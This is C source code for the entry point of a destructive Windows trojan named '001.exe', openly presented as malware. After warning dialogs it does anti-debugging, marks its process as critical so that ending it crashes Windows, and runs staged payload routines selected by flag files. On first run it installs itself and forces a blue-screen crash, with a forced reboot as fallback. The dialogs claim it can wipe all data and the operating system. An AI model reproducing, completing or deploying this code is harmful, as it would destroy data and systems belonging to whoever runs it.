#include "001.h"

ENTRY_POINT ( _001 )
{
if(MessageBoxW(NULL, 
L"This is malware. Running it will destroy your computer, but do so at your own risk if you don't mind being destroyed. Click yes to run it",
"WARNING - 001", MB_YESNO|MB_ICONWARNING)!=IDYES)
return 0;

	CreateMutexW ( NULL, TRUE, L"001.exe" );
	if( GetLastError ( ) == ERROR_ALREADY_EXISTS )
		return 3;

	SeedXorshift ( ( DWORD32_64 ) __rdtsc ( ) );
	
	WIN_VERSION_INFO version_info = { 0 };
	if( !GetWinVersion ( &version_info ) )
		return 1;

	if( 10 > version_info.Major )
	{
		MessageBoxW ( NULL, L"This version of Windows is not supported.", L"001 - Error", MB_OK | MB_ICONERROR );
		return 2;
	}

	AntiDebug ( );


	if( FlagExists ( L"001Flag.tmp" ) )
	{
SetProcessCritical ( TRUE );

		if( FlagExists ( L"001FlagsFINAL" ) )
			payload_startFINAL ( );

		if( FlagExists ( L"001Flags7" ) )
			payload_start7 ( );

		if( FlagExists ( L"001Flags6" ) )
			payload_start6 ( );

		if( FlagExists ( L"001Flags5" ) )
			payload_start5 ( );

		if( FlagExists ( L"001Flags4" ) )
			payload_start4 ( );

		if( FlagExists ( L"001Flags3" ) )
			payload_start3 ( );

		if( FlagExists ( L"001Flags2" ) )
			payload_start2 ( );

		else
			payload_start1 ( );
	}
	else
	{
	if( MessageBoxW ( NULL, L"WARNING!\n\nYou have ran a Trojan known as 001.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - 001", MB_YESNO | MB_ICONWARNING ) != IDYES )
		ExitProcess ( 1 );
	if( MessageBoxW ( NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - 001", MB_YESNO | MB_ICONWARNING ) != IDYES )
		ExitProcess ( 2 );

SetProcessCritical ( TRUE );

		All_Setup ( );                                                	//セットアップ
		if( !BSOD ( 0xC6666666 ) )                      		//ブルスク
			Shutdown ( EWX_REBOOT, NULL );			//ブルスク失敗したらシャットダウン
	}

	return 0;
}